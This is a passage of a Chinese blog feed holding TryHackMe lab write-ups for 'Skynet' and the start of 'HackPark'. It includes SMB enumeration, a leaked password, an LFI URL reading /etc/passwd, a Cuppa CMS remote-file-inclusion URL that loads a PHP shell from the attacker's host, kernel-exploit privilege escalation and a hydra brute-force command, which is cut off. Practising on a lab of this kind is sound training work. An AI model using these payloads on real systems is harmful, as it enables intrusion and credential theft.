<code>C:\srv\samba</code>。</li><li><strong>milesdyson</strong>: 这是Miles Dyson的个人共享，但是不允许匿名用户访问。路径为 <code>C:\home\milesdyson\share</code>。</li><li><strong>print$</strong>: 这是打印机驱动程序的共享，不允许匿名用户访问。路径为 <code>C:\var\lib\samba\printers</code>。</li></ul></li><li><p><strong>用户信息</strong>：</p><ul><li><strong>SKYNET\milesdyson</strong>: 这是一个普通用户账户，RID为1000，没有提供全名或描述信</li></ul></li></ol><table><thead><tr><th>共享资源</th><th>[[smb 445#找到特定的资源如何做?#]]</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><h3 id="0x11-smb登陆"><a href="#0x11-smb登陆" class="headerlink" title="0x11 smb登陆"></a>0x11 smb登陆</h3><blockquote><p>可以看到基本上匿名用户都有一个读写权限我们可以一一在匿名用户权限下 查看可以利用的文件</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient <span class="comment">//10.10.14.193/anonymous</span></span><br></pre></td></tr></table></figure><p>其实这个时候我试了一下nfs感觉还是linux 的感觉多一些<br>找了一条通知消息</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">最近系统故障导致多个密码被更改。所有Skynet员工在看到这条消息后需要更改他们的密码。</span><br><span class="line"></span><br><span class="line">- 迈尔斯·戴森</span><br></pre></td></tr></table></figure><p>试试milesdyson用户的私有文件思路断了</p><h3 id="0x20-web"><a href="#0x20-web" class="headerlink" title="0x20 web"></a>0x20 web</h3><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><h6 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http://10.10.104.193/ ----</span><br><span class="line">==&gt; DIRECTORY: http://10.10.104.193/admin/                              </span><br><span class="line">==&gt; DIRECTORY: http://10.10.104.193/config/                                                                                                          </span><br><span class="line">==&gt; DIRECTORY: http://10.10.104.193/css/                                             </span><br><span class="line">+ http://10.10.104.193/index.html (CODE:200|SIZE:523)                                   </span><br><span class="line">==&gt; DIRECTORY: http://10.10.104.193/js/                                                                                                                                </span><br><span class="line">+ http://10.10.104.193/server-status (CODE:403|SIZE:278)                                                                                                               </span><br><span class="line">==&gt; DIRECTORY: http://10.10.104.193/squirrelmail/  </span><br><span class="line">[21:32:40] 403 -  278B  - /.ht_wsr.txt                                      </span><br><span class="line">[21:32:40] 403 -  278B  - /.htaccess.orig                                   </span><br><span class="line">[21:32:40] 403 -  278B  - /.htaccess.sample</span><br><span class="line">[21:32:40] 403 -  278B  - /.htaccess.save</span><br><span class="line">[21:32:40] 403 -  278B  - /.htaccess_extra                                  </span><br><span class="line">[21:32:40] 403 -  278B  - /.htaccess_orig</span><br><span class="line">[21:32:40] 403 -  278B  - /.htaccessBAK</span><br><span class="line">[21:32:40] 403 -  278B  - /.htaccessOLD                                     </span><br><span class="line">[21:32:40] 403 -  278B  - /.htaccessOLD2</span><br><span class="line">[21:32:40] 403 -  278B  - /.html                                            </span><br><span class="line">[21:32:40] 403 -  278B  - /.htaccess_sc</span><br><span class="line">[21:32:40] 403 -  278B  - /.htm                                             </span><br><span class="line">[21:32:40] 403 -  278B  - /.httr-oauth                                      </span><br><span class="line">[21:32:40] 403 -  278B  - /.htpasswds</span><br><span class="line">[21:32:40] 403 -  278B  - /.htpasswd_test</span><br><span class="line">[21:32:41] 403 -  278B  - /.htaccess.bak1                                   </span><br><span class="line">[21:32:44] 403 -  278B  - /.php                                             </span><br><span class="line">[21:32:44] 403 -  278B  - /.php3                                            </span><br><span class="line">[21:33:05] 403 -  278B  - /admin/                                           </span><br><span class="line">[21:33:46] 403 -  278B  - /config/                                          </span><br><span class="line">[21:34:22] 403 -  278B  - /js/                                              </span><br><span class="line">[21:35:02] 403 -  278B  - /server-status                                    </span><br><span class="line">[21:35:04] 403 -  278B  - /server-status/ </span><br></pre></td></tr></table></figure><blockquote><p>admin被禁止 访问到一个框架 SquirrelMail version 1.4.23<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240625213714.png" alt="image.png"></p></blockquote><blockquote><p>发现一个远程代码执行漏洞但是目前唯一的问题是 我不知道登陆用户的账号和密码<br>因此无法利用 还是要看看能不能找到<br>之前看到一个信息泄露 milesdyson 猜测可能有他的邮箱</p></blockquote><p>还有个文件包含 h<a href="http://10.10.12.99/squirrelmail/src/redirect.php?plugins%5B%5D=../../../../etc/passwd%00">http://10.10.12.99/squirrelmail/src/redirect.php?plugins[]=../../../../etc/passwd%00</a><br>试了没啥效果 …..</p><h5 id="回溯smb"><a href="#回溯smb" class="headerlink" title="回溯smb"></a>回溯smb</h5><blockquote><p>回溯smb协议<br>看错了 log目录没看到 里面有log1.txt 泄露了很多可以看到密码<br>直接bp爆破</p></blockquote><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240628165637.png" alt="image.png"></p><p>可以看到cyborg007haloterminator  是用户的密码  milesdyson</p><h4 id="0x22-继续信息收集"><a href="#0x22-继续信息收集" class="headerlink" title="0x22 继续信息收集"></a>0x22 继续信息收集</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/images               (Status: 301) [Size: 324] [--&gt; http://10.10.66.17/squirrelmail/images/]</span><br><span class="line">/help                 (Status: 403) [Size: 276]</span><br><span class="line">/themes               (Status: 301) [Size: 324] [--&gt; http://10.10.66.17/squirrelmail/themes/]</span><br><span class="line">/plugins              (Status: 301) [Size: 325] [--&gt; http://10.10.66.17/squirrelmail/plugins/]</span><br><span class="line">/src                  (Status: 301) [Size: 321] [--&gt; http://10.10.66.17/squirrelmail/src/]</span><br><span class="line">/include              (Status: 403) [Size: 276]</span><br><span class="line">/config               (Status: 301) [Size: 324] [--&gt; http://10.10.66.17/squirrelmail/config/]</span><br><span class="line">/class                (Status: 403) [Size: 276]</span><br><span class="line">/functions            (Status: 403) [Size: 276]</span><br><span class="line">/po                   (Status: 403) [Size: 276]</span><br><span class="line">/locale               (Status: 403) [Size: 276]</span><br></pre></td></tr></table></figure><blockquote><p>这次咱们用 用户进去看看权限 403 页面登陆了还是禁止的<br>但是我们看到了三个邮件</p></blockquote><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240628205742.png" alt="image.png"></p><blockquote><p>smb的密码改了跟我们在smb中获取的信息是一样的  强制修改了密码</p></blockquote><p>先看看smb 共享文件  milesdyson</p><figure class="highlight plaintext"><figcaption><span>for [WORKGROUP\milesdyson]:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; dir</span><br><span class="line">  .                                   D        0  Tue Sep 17 09:05:47 2019</span><br><span class="line">  ..                                  D        0  Wed Sep 18 03:51:03 2019</span><br><span class="line">  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 09:05:14 2019</span><br><span class="line">  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 09:05:14 2019</span><br><span class="line">  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 09:05:14 2019</span><br><span class="line">  notes                               D        0  Tue Sep 17 09:18:40 2019</span><br><span class="line">  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 09:05:14 2019</span><br><span class="line">  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 09:05:14 2019</span><br><span class="line"></span><br><span class="line">                9204224 blocks of size 1024. 5653536 blocks available</span><br><span class="line">smb: \&gt; </span><br></pre></td></tr></table></figure><p>全部dump 下来<br>得到很多pdf 和一个笔记<br>很好 import.txt 放着一个代办清单 在这里可以看到</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. Add features to beta CMS /45kra24zxs28v3yd</span><br><span class="line">2. Work on T-800 Model 101 blueprints</span><br><span class="line">3. Spend more time with my wife</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>陪家人 之后要在CMS &#x2F;45kra24zxs28v3yd 中开发功能<br>其他的看不懂 估计是跟这个神经网络有关 因此<br>还是先访问这个页面 感觉也没啥啊<br>太无语了<br>经过提示 ……. 没想到一个重要的一点<br>就是 我们看到他的清单 他第一个任务是想要去做一个cms 的功能点维护<br>这个时候我就应该想到  这就是个cms</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cms cuppa扫描</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x23-cuppacms"><a href="#0x23-cuppacms" class="headerlink" title="0x23 cuppacms"></a>0x23 cuppacms</h3><blockquote><p>这个很快啊 直接就找到了一个nday   远程文件包含<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240628220759.png" alt="image.png"></p></blockquote><p>很舒服  而且看到后端是php<br>直接一句话木马 getshell 试试</p><h3 id="0x30-Get-shell"><a href="#0x30-Get-shell" class="headerlink" title="0x30 Get_shell"></a>0x30 Get_shell</h3><blockquote><p>还记得刚才的是一个 SquirrelMail version 1.4.23<br>找了一个rce但是一直连不上</p></blockquote><p>现在换成  cuppa cms 的 RFI</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alerts/alertConfigField.php?urlConfig=http://10.11.69.232:8000/1.php</span><br></pre></td></tr></table></figure><p>**exp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.70.173/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.69.232/1.php</span><br></pre></td></tr></table></figure><p>不知道为啥他好像不支持 bash 而且 nc也反弹不会来 蚁剑传一个php反向连接shell<br>只能这么做了 直接getshell</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240703162847.png" alt="image.png"></p><h3 id="0x40Post"><a href="#0x40Post" class="headerlink" title="0x40Post"></a>0x40Post</h3><blockquote><p>依旧是信息收集 先来信息收集</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux version 4.8.0-58-generic (buildd@lgw01-21) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017</span><br></pre></td></tr></table></figure><p>可以看到之前的判断没有错误确实是linux的ubuntu<br>其实运气挺好的  直接就发现一个内核的nday<br>直接就提权了 拿到shell</p><p><a href="https://www.exploit-db.com/exploits/45010">内核nday 漏洞地址</a></p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240703165323.png" alt="image.png"></p><p>内核版本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4.4</span>.<span class="number">0</span><span class="number">-31</span>-generic</span><br><span class="line"><span class="number">4.4</span>.<span class="number">0</span><span class="number">-62</span>-generic</span><br><span class="line"><span class="number">4.4</span>.<span class="number">0</span><span class="number">-81</span>-generic</span><br><span class="line"><span class="number">4.4</span>.<span class="number">0</span><span class="number">-116</span>-generic</span><br><span class="line"><span class="number">4.8</span>.<span class="number">0</span><span class="number">-58</span>-generic</span><br><span class="line"><span class="number">4.10</span>.<span class="number">0.42</span>-generic</span><br><span class="line"><span class="number">4.13</span>.<span class="number">0</span><span class="number">-21</span>-generic</span><br></pre></td></tr></table></figure><p>看了wp 之后发现另外一种方式</p><table><thead><tr><th>tar 计划任务提权</th><th>[[suid#tar of suid#]]</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tryhackme </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thm-Hackpark</title>
      <link href="/2024/08/17/Thm-Hackpark/"/>
      <url>/2024/08/17/Thm-Hackpark/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>机器名称</th><th>HackPark</th></tr></thead><tbody><tr><td>系统</td><td>windows</td></tr><tr><td>状态</td><td>攻击性路径</td></tr><tr><td>信息</td><td>第一次打开源框架 主要是一个口令爆破 最后才是rce 的Blogengine 3.3.6 后三种提权方式 一种是msf 之后是服务提权和rdp 原生的shell</td></tr></tbody></table><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h4 id="确定端口"><a href="#确定端口" class="headerlink" title="确定端口"></a>确定端口</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">3389/tcp open  ms-wbt-server</span><br><span class="line">MAC Address: 02:E8:E8:78:7F:53 (Unknown)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>目前使用默认扫描扫出来了两个端口  因此此时需要全端口扫一遍<br>还是觉得太少了 </p></blockquote><h5 id="详细扫描一下80和3389"><a href="#详细扫描一下80和3389" class="headerlink" title="详细扫描一下80和3389"></a>详细扫描一下80和3389</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">80/tcp   open  http           Microsoft IIS httpd 8.5</span><br><span class="line"></span><br><span class="line">3389/tcp open  ms-wbt-server?</span><br><span class="line">| ssl-cert: Subject: commonName=hackpark</span><br><span class="line">| Not valid before: 2024-05-19T12:37:18</span><br><span class="line">|_Not valid after:  2024-11-18T12:37:18</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port3389-TCP:V=7.93%I=7%D=5/20%Time=664B470A%P=x86_64-pc-linux-gnu%r(Te</span><br><span class="line">SF:rminalServerCookie,13,&quot;\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\x0f\x08\0\x0</span><br><span class="line">SF:2\0\0\0&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: WAP|phone</span><br><span class="line">Running: Linux 2.4.X|2.6.X, Sony Ericsson embedded</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivaz</span><br><span class="line">OS details: Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phone</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 根据提供的信息，设备类型可能是无线接入点（WAP）或运行Linux 2.4.X或2.6.X的手机，可能带有索尼爱立信的嵌入式技术。具体的操作系统详细信息表明它可能运行着带有Linux 2.4.20或2.6.22的番茄固件，或者是索尼爱立信U8i Vivaz手机。此外，服务信息表明操作系统可能是Windows</span></span></span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 3389/tcp)</span><br><span class="line">HOP RTT    ADDRESS</span><br><span class="line">1   ... 30</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li></li></ul><h5 id="分析一波"><a href="#分析一波" class="headerlink" title="分析一波"></a>分析一波</h5><blockquote><p>首先至少知道了<br>web服务器Microsoft IIS httpd 8.5  并且可以确定了 基本os 就是windows<br>*分析 3389<br>根据提供的信息，端口3389&#x2F;tcp是开放的，可能是运行着ms-wbt-server服务。此外，SSL证书的主题为commonName&#x3D;hackpark，证书的有效期从2024年5月19日至2024年11月18日。另外，扫描结果显示有一个未识别的服务，但提供了一些指纹信息。指纹信息中包含了关于端口3389的TCP服务的一些特征数据。其中包括了一些十六进制编码的数据，可能用于识别服务或版本信息。</p></blockquote><p>总的来说，这些信息表明设备上可能正在运行一个ms-wbt-server服务，并且具有关于SSL证书和端口特征的一些详细信息。</p><table><thead><tr><th>3389端口</th><th><a href="3389%20rdp.md">3389 rdp</a></th></tr></thead></table><h2 id="磨一下web"><a href="#磨一下web" class="headerlink" title="磨一下web"></a>磨一下web</h2><h5 id="信息收集一波"><a href="#信息收集一波" class="headerlink" title="信息收集一波"></a>信息收集一波</h5><table><thead><tr><th>web信息收集<a href="%E8%BE%B9%E7%BC%98%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86.md">边缘资产收集</a></th><th><a href="%E8%BE%B9%E7%BC%98%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86.md">边缘资产收集</a></th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><h4 id="扫一遍目录"><a href="#扫一遍目录" class="headerlink" title="扫一遍目录"></a>扫一遍目录</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">[19:11:25] Starting:                                                                                                                          </span><br><span class="line">[19:11:28] 403 -  312B  - /%2e%2e//google.com                               </span><br><span class="line">[19:11:29] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             </span><br><span class="line">[19:11:46] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           </span><br><span class="line">[19:11:51] 301 -  152B  - /account  -&gt;  http://10.10.186.107/account/       </span><br><span class="line">[19:11:51] 403 -    1KB - /account/                                         </span><br><span class="line">[19:11:51] 200 -    4KB - /account/login.aspx                               </span><br><span class="line">[19:11:57] 302 -  173B  - /ADMIN  -&gt;  http://10.10.186.107/Account/login.aspx?ReturnURL=/ADMIN</span><br><span class="line">[19:11:57] 302 -  173B  - /admin  -&gt;  http://10.10.186.107/Account/login.aspx?ReturnURL=/admin</span><br><span class="line">[19:11:57] 302 -  173B  - /Admin  -&gt;  http://10.10.186.107/Account/login.aspx?ReturnURL=/Admin</span><br><span class="line">[19:11:59] 302 -  174B  - /Admin/  -&gt;  http://10.10.186.107/Account/login.aspx?ReturnURL=/Admin/</span><br><span class="line">[19:11:59] 302 -  174B  - /admin/  -&gt;  http://10.10.186.107/Account/login.aspx?ReturnURL=/admin/</span><br><span class="line">[19:12:01] 302 -  179B  - /admin/index  -&gt;  http://10.10.186.107/Account/login.aspx?ReturnURL=/admin/index</span><br><span class="line">[19:12:29] 200 -    8KB - /archive                                          </span><br><span class="line">[19:12:29] 301 -  158B  - /aspnet_client  -&gt;  http://10.10.186.107/aspnet_client/</span><br><span class="line">[19:12:29] 200 -    8KB - /archiver                                         </span><br><span class="line">[19:12:29] 200 -    8KB - /archives                                         </span><br><span class="line">[19:12:29] 200 -    8KB - /archive.aspx                                     </span><br><span class="line">[19:12:30] 403 -    1KB - /aspnet_client/                                   </span><br><span class="line">[19:12:40] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     </span><br><span class="line">[19:12:47] 403 -    1KB - /content/                                         </span><br><span class="line">[19:12:47] 301 -  152B  - /content  -&gt;  http://10.10.186.107/content/       </span><br><span class="line">[19:12:50] 200 -   13KB - /contact                                          </span><br><span class="line">[19:12:50] 200 -   13KB - /contact_us                                       </span><br><span class="line">[19:12:50] 200 -   13KB - /contactus                                        </span><br><span class="line">[19:12:50] 200 -   13KB - /contacts</span><br><span class="line">[19:12:50] 200 -   13KB - /contact.aspx                                     </span><br><span class="line">[19:12:50] 403 -    1KB - /custom/                                          </span><br><span class="line">[19:12:58] 200 -    7KB - /error.aspx                                       </span><br><span class="line">[19:13:01] 301 -  150B  - /fonts  -&gt;  http://10.10.186.107/fonts/           </span><br><span class="line">[19:13:28] 302 -  138B  - /page.aspx  -&gt;  http://10.10.186.107/             </span><br><span class="line">[19:13:42] 200 -  303B  - /robots.txt                                       </span><br><span class="line">[19:13:43] 403 -    1KB - /scripts/                                         </span><br><span class="line">[19:13:43] 301 -  152B  - /scripts  -&gt;  http://10.10.186.107/scripts/       </span><br><span class="line">[19:13:44] 200 -    8KB - /Search                                           </span><br><span class="line">[19:13:44] 200 -    8KB - /search_admin</span><br><span class="line">[19:13:44] 200 -    8KB - /search                                           </span><br><span class="line">[19:13:44] 200 -    8KB - /search.aspx</span><br><span class="line">[19:13:46] 302 -  175B  - /setup  -&gt;  http://10.10.186.107/Account/login.aspx?ReturnUrl=%2fsetup</span><br><span class="line">[19:13:46] 302 -  178B  - /setup/  -&gt;  http://10.10.186.107/Account/login.aspx?ReturnUrl=%2fsetup%2f</span><br><span class="line">[19:14:00] 200 -    8KB - /Trace.axd  </span><br></pre></td></tr></table></figure><blockquote><p>敏感文件泄露可以看到一些 </p></blockquote><h5 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /Account/*.*</span><br><span class="line">Disallow: /search</span><br><span class="line">Disallow: /search.aspx</span><br><span class="line">Disallow: /error404.aspx</span><br><span class="line">Disallow: /archive</span><br><span class="line">Disallow: /archive.aspx        </span><br><span class="line">#Remove the &#x27;#&#x27; character below and replace example.com with your own website address.</span><br><span class="line">#sitemap: http://example.com/sitemap.axd </span><br><span class="line"># WebMatrix 1.0</span><br></pre></td></tr></table></figure><blockquote><p>翻了一圈其实没啥东西 看到 ammin 之后的登录框 可以看到<br>其实有很多思路 但是我们 最开始想到的绝对是弱口令<br>同时可以看到 源代码有一些框架版本的泄露</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--- BlogEngine 3.3.6.0 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是 没默认密码</p><h4 id="组件-框架识别"><a href="#组件-框架识别" class="headerlink" title="组件 框架识别"></a>组件 框架识别</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.16.159 [200 OK] ASP_NET, Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/8.5], IP[10.10.16.159], JQuery[1.9.1], Meta-Author[My name], Microsoft-IIS[8.5], OpenSearch[http://10.10.16.159/opensearch.axd], Script[application/ld+json,text/javascript], Title[hackpark | hackpark amusements][Title element contains newline(s)!], UncommonHeaders[content-style-type,content-script-type], X-Powered-By[ASP.NET], X-UA-Compatible[IE=edge]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- 网站地址：[http://10.10.16.159](http://10.10.16.159/)</span><br><span class="line">- HTTP 状态码：200 OK（表示请求成功）</span><br><span class="line">- 使用的技术和框架：[ASP.NET](http://asp.net/)、Bootstrap、HTML5、JQuery</span><br><span class="line">- 服务器信息：Microsoft-IIS/8.5</span><br><span class="line">- IP 地址：10.10.16.159 IP地址：10.10.16.159</span><br><span class="line">- 页面标题：hackpark | hackpark amusements  </span><br><span class="line">    页面标题：hackpark |哈克公园娱乐</span><br><span class="line">- 其他信息：包括元数据作者、脚本类型、支持的搜索引擎、X-Powered-By 等</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><table><thead><tr><th>登录框</th><th>[[弱口令爆破#]]</th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><p>用hydra爆破</p><blockquote><p>选admin   之后字典使用 随便一个 爆破<br>其实这一点感觉还是比较 不熟悉还是看了wp 之后看到了hydra命令但感觉仿佛用bp更方便一些<br>但是可以看一看这个 </p></blockquote><p>我们使用hydra时候必须注意 加上post包<br><img src="/Pasted%20image%2020240523211520.png"></p><ul><li><p><code>__VIEWSTATE</code> 和 <code>__EVENTVALIDATION</code>: 这两个字段是 <a href="http://asp.net/">ASP.NET</a> Web Forms 页面中的隐藏字段，用于在页面间保持状态和验证事件。它们的值在每次页面加载时都会变化，并且需要在提交表单时包含正确的值，以确保请求的有效性。</p></li><li><p><code>ctl00$MainContent$LoginUser$UserName=admin</code> 和 <code>ctl00$MainContent$LoginUser$Password=121</code>: 这是用户名和密码字段的值。在这个例子中，用户名是 “admin”，密码是 “121”。</p></li><li><p><code>ctl00$MainContent$LoginUser$RememberMe=on</code>: 这个字段表示用户是否选择了“记住我”的选项，它是一个复选框的状态，如果用户选择了记住登录状态，则这个字段的值为 “on”。</p></li><li><p><code>ctl00$MainContent$LoginUser$LoginButton=登录</code>: 这个字段表示用户点击了登录按钮。在这个例子中，提交表单的动作是登录。</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.10.186.107 http-post-form 